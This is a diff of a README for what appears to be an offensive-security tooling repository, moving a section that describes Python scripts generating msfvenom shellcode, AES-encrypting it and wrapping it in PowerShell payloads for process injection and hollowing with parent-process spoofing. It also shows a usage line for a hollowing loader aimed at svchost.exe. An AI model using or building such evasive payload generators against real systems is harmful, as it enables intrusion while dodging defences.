@@ -37,6 +37,14 @@ C# project source code for (IP + port + process + parent-process) cli passed pro
 clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer 
 ```
 
+## [powerhollow.py](./powershell/powerhollow.py) and [powerinject.py](./powershell/powerinject.py)
+
+These python scripts call `msfvenom` to generate shellcode, AES encrypt it, and then embed it within hardcoded powershell code in order to dynamically produce *.PS1* payloads according to user supplied options.  These *.PS1* payloads are modeled after the OSEP *.PS1* that utilizes dynamic lookup rather than `add-type` in order to prevent writing to disk when calling `csc`.  
+
+`Powerinject.py` payloads succeed here; however I was unable to find a way to define the structs necessary for doing PPID spoofing with Process hollowing, so **add-type IS called in the `Powerhollow.py`** *.PS1* payloads, however this is only done for the necessesary structs and the `createproces()` Win32API. All other required API's are resolved dynamically.
+
+Run the appropriate python script for the kind of payload you want to use and then place the produced files in your webserver directory and use the supplied PS one liner in order to call them.
+
 ## [D_invoke](./D_invoke/Builder/Program.cs)
 
 C# project that produces D/invoke payloads (basic, injector, hollower + ppid spoof) in exe, dll, or service exe format.  Use pre-built builder.exe in the D_Invoke directory.
@@ -93,16 +101,6 @@ Note that this tool was developed for personal use, not production.  As such the
     - i.e. `builder.exe` should be in the same folder as the dll, exe, and service folders as it is on the hosted repo
 2. Additionally, MSBuild is hardcoded for VS2019
     - If you are utilizing a different version, you will need to edit the source code of `Builder.exe` and update it with the path to MSBuild within your version.
-
-## [powerhollow.py](./powershell/powerhollow.py) and [powerinject.py](./powershell/powerinject.py)
-
-> TODO: Currently break when AMSI not being used on target. FIX.
-
-These python scripts call `msfvenom` to generate shellcode, AES encrypt it, and then embed it within hardcoded powershell code in order to dynamically produce *.PS1* payloads according to user supplied options.  These *.PS1* payloads are modeled after the OSEP *.PS1* that utilizes dynamic lookup rather than `add-type` in order to prevent writing to disk when calling `csc`.  
-
-`Powerinject.py` payloads succeed here; however I was unable to find a way to define the structs necessary for doing PPID spoofing with Process hollowing, so **add-type IS called in the `Powerhollow.py`** *.PS1* payloads, however this is only done for the necessesary structs and the `createproces()` Win32API. All other required API's are resolved dynamically.
-
-Run the appropriate python script for the kind of payload you want to use and then place the produced files in your webserver directory and use the supplied PS one liner in order to call them.
 
 ## `/bins/`
 
